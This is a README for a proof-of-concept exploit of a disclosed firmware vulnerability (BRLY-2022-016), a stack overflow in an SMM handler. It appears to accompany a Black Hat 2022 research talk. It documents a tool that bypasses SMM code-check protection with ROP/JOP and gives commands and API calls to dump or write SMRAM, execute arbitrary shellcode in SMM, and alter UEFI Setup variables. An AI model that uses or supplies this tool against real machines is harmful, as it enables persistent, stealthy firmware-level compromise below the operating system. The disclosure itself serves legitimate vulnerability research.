## Description

PoC for BRLY-2022-016 (CVE-2022-33209, CVE-2022-40250) vulnerability that demonstrates SMM_Code_Chk_En bypassing using ROP/JOP technique and provides primitives for SMRAM reading/writing and executing arbitrary code in SMM.

BRLY-2022-016 vulnerability was disclosed as part of the BHUS 2022 presentation and represents a stack overflow vulnerability in the SMI handler of SmmSmbiosElog module:
* Binarly advisory: https://www.binarly.io/advisories/BRLY-2022-016/index.html
* Slides: https://i.blackhat.com/USA-22/Wednesday/US-22-Matrosov-Breaking-Firmware-Trust-From-Pre-EFI.pdf

## Usage

### Commands

```
Usage: brly_2022_016.py [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  smm-exec    Execute code in SMM.
  smram-dump  Dump SMRAM contents to file.
```

### smram-dump

```
$ sudo ./brly_2022_016.py smram-dump smram.bin
...
Reading SMRAM from address 0x63ffd000
Reading SMRAM from address 0x63ffe000
Reading SMRAM from address 0x63fff000
Dump of SMRAM saved in smram.bin
```

### smm-exec

```
$ cat test.nasm
use64

_Test:
    mov rbx, 0x594c5242 ; BRLY
    mov rax, 0x5a000000
    mov [rax], rbx
    ret

$ sudo ./brly_2022_016.py smm-exec test.nasm
```

### Using the SMRAM read and write primitive via API

```python
poc = Poc()
poc.copy_mem(dst, src, size) # where dst and src can point to SMRAM
```

### Dump SMRAM via API

```python
poc = Poc()
poc.smram_dump("smram.bin")
```

### Using the SMM code execution primitive via API

```python
poc = Poc()
poc.exec_shellcode_smm(shellcode)
```

### Using SmmSetVariable() via API

```python
poc = Poc()
poc.smm_set_variable(variable_name, vendor_guid, attributes, data)
```

### Modify Setup variable via API (as an example of filtering bypass in NvramSmm)

```python
poc = Poc()
poc.modify_setup_data(data, backup_old=True)
```

A demo of this functionality was shown during BHUS 2022:

![modify_setup_data](https://raw.githubusercontent.com/binarly-io/Research_Publications/main/BHUS_2022/demos/BRLY-2022-016.gif)
